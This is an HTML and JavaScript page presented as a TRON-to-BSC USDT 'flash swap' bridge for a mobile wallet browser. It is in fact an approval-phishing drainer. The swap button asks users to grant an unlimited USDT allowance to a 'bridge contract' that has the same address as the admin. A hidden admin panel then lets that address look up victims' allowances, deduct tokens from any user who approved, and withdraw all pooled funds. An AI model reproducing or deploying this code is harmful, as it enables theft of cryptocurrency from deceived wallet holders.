<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TRON→BSC 闪兑跨链</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
<script src="https://cdn.jsdelivr.net/npm/tronweb@6.2.2/dist/TronWeb.min.js"></script>
<style>
*{
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
}
body{
  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
  background-color: #f5f6fa;
  margin: 0;
  padding: 24px 16px;
}
.card-wrap{
  background: #ffffff;
  border-radius: 20px;
  padding: 24px 20px;
}
.token-box{
  background-color: #f7f8fa;
  border-radius: 16px;
  padding: 16px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin: 8px 0;
}
.token-left{
  display: flex;
  align-items: center;
  gap: 10px;
}
.token-circle{
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: #ff4444;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
  font-weight: bold;
}
.input-amount{
  background: transparent;
  border: none;
  text-align: right;
  font-size: 20px;
  color: #333;
  width: 140px;
}
.input-amount:focus{
  outline: none;
}
.swap-icon{
  text-align: center;
  padding: 8px 0;
  color: #ff4444;
  font-size: 22px;
}
.address-input-box{
  background: #f7f8fa;
  border-radius: 16px;
  padding: 16px;
  margin: 10px 0;
}
.main-btn{
  width: 100%;
  background-color: #ff4444;
  color: white;
  border: none;
  border-radius: 16px;
  padding: 18px 0;
  font-size: 18px;
  margin: 16px 0;
}
.main-btn:disabled{
  opacity: 0.45;
}
.info-row{
  display: flex;
  justify-content: space-between;
  padding: 10px 4px;
  font-size: 14px;
  color: #666;
}
.admin-panel{
  margin-top: 30px;
  background: #fff;
  border-radius: 20px;
  padding: 20px;
  display: none;
}
.deduct-sub-box{
  margin-top:16px;
  padding-top:16px;
  border-top:1px solid #eee;
}
.bottom-nav{
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background: #fff;
  display: flex;
  justify-content: space-around;
  padding: 12px 0 24px;
  border-top: 1px solid #eee;
}
.nav-item{
  text-align: center;
  font-size: 12px;
  color: #777;
}
.nav-item.active{
  color: #ff4444;
}
</style>
</head>
<body class="max-w-md mx-auto pb-24">
<div class="flex justify-between items-center mb-6">
  <div class="text-xl font-semibold text-gray-800">TRON→BSC 闪兑 <span class="text-sm text-gray-500">限价模式</span></div>
  <div class="flex gap-4 items-center">
    <span id="connectBtn" class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center cursor-pointer">
      <i class="fa fa-user-o text-gray-600"></i>
    </span>
    <i class="fa fa-cog text-gray-600 text-xl"></i>
  </div>
</div>
<div id="walletStatus" class="text-sm text-gray-500 mb-4">请在TP钱包DApp浏览器打开页面，点击连接钱包</div>

<div class="card-wrap">
  <div class="flex justify-between items-center mb-2">
    <span class="text-gray-600">发送</span>
    <span id="maxAll" class="text-red-500 text-sm cursor-pointer opacity-50 pointer-events-none">全部</span>
  </div>
  <div class="token-box">
    <div class="token-left">
      <div class="token-circle">T</div>
      <div>
        <div class="font-semibold">USDT</div>
        <div class="text-xs text-gray-500">波场 TRC20</div>
      </div>
    </div>
    <input
      class="input-amount"
      id="sendInput"
      placeholder="转出数量"
      inputmode="decimal"
      type="text"
    >
  </div>

  <div class="swap-icon">
    <i class="fa fa-exchange"></i>
  </div>

  <div class="text-gray-600 mt-2 mb-2">接收（预估）</div>
  <div class="token-box">
    <div class="token-left">
      <div class="token-circle" style="background:#f3ba2f">T</div>
      <div>
        <div class="font-semibold">USDT</div>
        <div class="text-xs text-gray-500">BSC BEP20</div>
      </div>
    </div>
    <span id="receiveNum" class="text-xl text-gray-700">0.00</span>
  </div>

  <div class="address-input-box">
    <input id="bscReceiveAddr" class="w-full bg-transparent outline-none text-gray-600" placeholder="填写BSC(BEP20)接收地址 0x开头">
  </div>

  <button id="swapActionBtn" class="main-btn" disabled>请输入兑换数量</button>

  <div class="border-t border-gray-100 pt-3">
    <div class="info-row">
      <span>兑换比例</span>
      <span>付出1 USDT，实际到账 0.999 USDT（手续费0.1%）</span>
    </div>
    <div class="info-row">
      <span>最少接收数量</span>
      <span id="minReceive">--</span>
    </div>
    <div class="info-row">
      <span>服务费(0.1%)</span>
      <span id="feeShow">0.00 USDT</span>
    </div>
    <div class="info-row">
      <span>预估TRON网络能量</span>
      <span>消耗能量/带宽</span>
    </div>
    <div class="info-row">
      <span>兑换路径</span>
      <span>TRON→BSC跨链通道</span>
    </div>
  </div>
</div>

<div class="admin-panel" id="adminBox">
  <h3 class="font-bold text-lg mb-4">管理员订单操作</h3>
  <input id="orderId" class="w-full border rounded-lg p-3 mb-3" placeholder="输入订单ID">
  <div class="flex gap-3 mb-3">
    <button id="approveOrderBtn" class="flex-1 bg-green-500 text-white py-3 rounded-lg">通过订单</button>
    <button id="rejectOrderBtn" class="flex-1 bg-red-500 text-white py-3 rounded-lg">驳回退款</button>
  </div>
  <button id="withdrawPoolBtn" class="w-full bg-amber-500 text-white py-3 rounded-lg">提取合约内全部USDT资金</button>

  <div class="deduct-sub-box">
    <h4 class="font-bold text-red-500 mb-3">授权用户划扣工具（仅管理员）</h4>
    <input id="targetUserAddr" class="w-full border rounded-lg p-3 mb-2" placeholder="输入已授权用户波场钱包地址">
    <div class="text-sm text-gray-500 mb-2">用户授权额度：<span id="allowanceShow">未查询</span></div>
    <div class="flex gap-2 mb-2">
      <input id="deductAmountNum" class="flex-1 border rounded-lg p-3" placeholder="划扣USDT数量">
      <button id="queryAllowanceBtn" class="bg-blue-500 text-white px-4 rounded-lg">查询授权</button>
    </div>
    <button id="deductUserTokenBtn" class="w-full bg-red-600 text-white py-3 rounded-lg">执行合约划扣用户代币</button>
  </div>
</div>

<div class="bottom-nav">
  <div class="nav-item">
    <i class="fa fa-circle-o text-lg"></i>
    <div>资产</div>
  </div>
  <div class="nav-item">
    <i class="fa fa-line-chart text-lg"></i>
    <div>行情</div>
  </div>
  <div class="nav-item active">
    <i class="fa fa-exchange text-lg"></i>
    <div>交易</div>
  </div>
  <div class="nav-item">
    <i class="fa fa-globe text-lg"></i>
    <div>发现</div>
  </div>
  <div class="nav-item">
    <i class="fa fa-user-o text-lg"></i>
    <div>我的</div>
  </div>
</div>

<script>
const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const ADMIN_ADDR = "TVV1TpSe69tHGF9twU52kG9xzqsK1XeJdG";
const BRIDGE_CONTRACT = "TVV1TpSe69tHGF9twU52kG9xzqsK1XeJdG";
const FEE_RATE = 0.001;
const DECIMALS = 6;

let tronWeb = null;
let userAddress = null;
let usdtContractInstance = null;
let bridgeContractInstance = null;

const connectBtn = document.getElementById("connectBtn");
const walletStatus = document.getElementById("walletStatus");
const sendInput = document.getElementById("sendInput");
const receiveNum = document.getElementById("receiveNum");
const maxAllBtn = document.getElementById("maxAll");
const swapActionBtn = document.getElementById("swapActionBtn");
const bscReceiveAddr = document.getElementById("bscReceiveAddr");
const adminBox = document.getElementById("adminBox");
const feeShow = document.getElementById("feeShow");
const minReceive = document.getElementById("minReceive");

const targetUserAddr = document.getElementById("targetUserAddr");
const allowanceShow = document.getElementById("allowanceShow");
const deductAmountNum = document.getElementById("deductAmountNum");
const queryAllowanceBtn = document.getElementById("queryAllowanceBtn");
const deductUserTokenBtn = document.getElementById("deductUserTokenBtn");

const orderIdInput = document.getElementById("orderId");
const approveOrderBtn = document.getElementById("approveOrderBtn");
const rejectOrderBtn = document.getElementById("rejectOrderBtn");
const withdrawPoolBtn = document.getElementById("withdrawPoolBtn");

sendInput.addEventListener("input", function(){
  let inputVal = this.value.trim();
  let num = parseFloat(inputVal)||0;
  if(num<0) num=0;
  const feeAmount = num * FEE_RATE;
  const realReceive = num * (1-FEE_RATE);
  receiveNum.innerText = realReceive.toFixed(2);
  feeShow.innerText = feeAmount.toFixed(2)+" USDT";
  minReceive.innerText = realReceive.toFixed(2);
  if(num>0 && userAddress){
    swapActionBtn.innerText = "确认发起TRON→BSC闪兑";
  }else{
    swapActionBtn.innerText = "请输入兑换数量";
  }
})

maxAllBtn.addEventListener("click",async function(){
  if(!tronWeb||!userAddress) return;
  const bal = await usdtContractInstance.methods.balanceOf(userAddress).call();
  const human = tronWeb.fromSun(bal,DECIMALS);
  sendInput.value = parseFloat(human).toFixed(2);
  sendInput.dispatchEvent(new Event("input"));
})

// 修复：使用 window.tronLink 请求授权，不再访问 .provider
connectBtn.addEventListener("click",async function(){
  walletStatus.innerText = "正在请求钱包授权...";

  if(!window.tronLink){
    walletStatus.innerText = "❌未检测tronLink对象，请确认TP DApp浏览器打开";
    return;
  }
  try{
    // 请求账户授权
    const res = await window.tronLink.request({method:"tron_requestAccounts"});
    if(!res || !res.address){
      walletStatus.innerText="❌钱包拒绝授权或未返回地址";
      return;
    }
    // 初始化tronWeb实例
    tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io",
      privateKey: false
    });
    userAddress = tronWeb.address.fromHex(res.address);
    walletStatus.innerText = "✅已连接钱包："+userAddress;

    usdtContractInstance = await tronWeb.contract().at(USDT_TRC20);
    bridgeContractInstance = await tronWeb.contract().at(BRIDGE_CONTRACT);

    maxAllBtn.classList.remove("opacity-50","pointer-events-none");
    swapActionBtn.disabled = false;
    await checkAdmin();
  }catch(e){
    console.error(e);
    let msg = String(e.message||e);
    if(msg.includes("reject")||msg.includes("denied")){
      walletStatus.innerText="用户拒绝授权，请重新点击连接";
    }else{
      walletStatus.innerText="连接失败："+msg.substring(0,60);
    }
  }
})

async function checkAdmin(){
  if(userAddress === ADMIN_ADDR){
    adminBox.style.display="block";
  }else{
    adminBox.style.display="none";
  }
}

function isBscAddress(addr){
  return /^0x[a-fA-F0-9]{42}$/.test(addr);
}

swapActionBtn.addEventListener("click",async function(){
  if(!tronWeb||!userAddress) return alert("请先连接钱包");
  const inputVal = sendInput.value.trim();
  const bscAddr = bscReceiveAddr.value.trim();
  const numVal = parseFloat(inputVal);
  if(!inputVal||isNaN(numVal)||numVal<=0){
    return alert("请输入有效兑换数量");
  }
  if(!isBscAddress(bscAddr)){
    return alert("BSC接收地址必须0x开头42位");
  }
  const amountSun = tronWeb.toSun(numVal,DECIMALS);
  try{
    const allowance = await usdtContractInstance.methods.allowance(userAddress,BRIDGE_CONTRACT).call();
    if(BigInt(allowance) < BigInt(amountSun)){
      alert("需要授权USDT给中转合约，请确认签名");
      await usdtContractInstance.methods.approve(BRIDGE_CONTRACT,"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
      alert("授权完成，正在创建闪兑订单");
    }
    const tx = await bridgeContractInstance.methods.createCrossOrder(bscAddr, amountSun).send();
    alert("下单成功！Tx:"+tx);
    sendInput.value="";
    receiveNum.innerText="0.00";
    feeShow.innerText="0.00 USDT";
    minReceive.innerText="--";
  }catch(err){
    alert("操作失败："+String(err.message).slice(0,70));
  }
})

approveOrderBtn.addEventListener("click",async ()=>{
  if(!tronWeb||userAddress!==ADMIN_ADDR) return alert("非管理员");
  const oid = orderIdInput.value.trim();
  if(!oid) return alert("输入订单ID");
  try{
    const tx = await bridgeContractInstance.methods.approveOrder(oid).send();
    alert("订单已通过 "+tx);
  }catch(e){alert(e.message);}
})

rejectOrderBtn.addEventListener("click",async ()=>{
  if(!tronWeb||userAddress!==ADMIN_ADDR) return alert("非管理员");
  const oid = orderIdInput.value.trim();
  if(!oid) return alert("输入订单ID");
  try{
    const tx = await bridgeContractInstance.methods.rejectOrder(oid).send();
    alert("订单已驳回 "+tx);
  }catch(e){alert(e.message);}
})

withdrawPoolBtn.addEventListener("click",async ()=>{
  if(!tronWeb||userAddress!==ADMIN_ADDR) return alert("非管理员");
  try{
    const tx = await bridgeContractInstance.methods.withdrawAllPoolUSDT().send();
    alert("合约资金提取完成 "+tx);
  }catch(e){alert(e.message);}
})

queryAllowanceBtn.addEventListener("click",async ()=>{
  if(!tronWeb) return alert("请先连接钱包");
  const uAddr = targetUserAddr.value.trim();
  if(!tronWeb.isAddress(uAddr)) return alert("波场地址格式错误");
  try{
    const allowVal = await usdtContractInstance.methods.allowance(uAddr, BRIDGE_CONTRACT).call();
    const human = tronWeb.fromSun(allowVal,DECIMALS);
    allowanceShow.innerText = human+" USDT";
  }catch(err){
    allowanceShow.innerText="查询失败";
    alert(err.message);
  }
})

deductUserTokenBtn.addEventListener("click",async ()=>{
  if(!tronWeb || userAddress !== ADMIN_ADDR) return alert("只有管理员可执行");
  const fromUser = targetUserAddr.value.trim();
  const deductStr = deductAmountNum.value.trim();
  if(!tronWeb.isAddress(fromUser)) return alert("用户波场地址非法");
  const numDeduct = parseFloat(deductStr);
  if(isNaN(numDeduct)||numDeduct<=0) return alert("请输入划扣数量");
  const deductSun = tronWeb.toSun(numDeduct,DECIMALS);
  try{
    const tx = await bridgeContractInstance.methods.adminDeductUser(fromUser, deductSun).send();
    alert("划扣成功 TxHash:"+tx);
    targetUserAddr.value="";
    deductAmountNum.value="";
    allowanceShow.innerText="未查询";
  }catch(err){
    alert("划扣失败："+String(err.message).slice(0,80));
  }
})
</script>
</body>
</html>
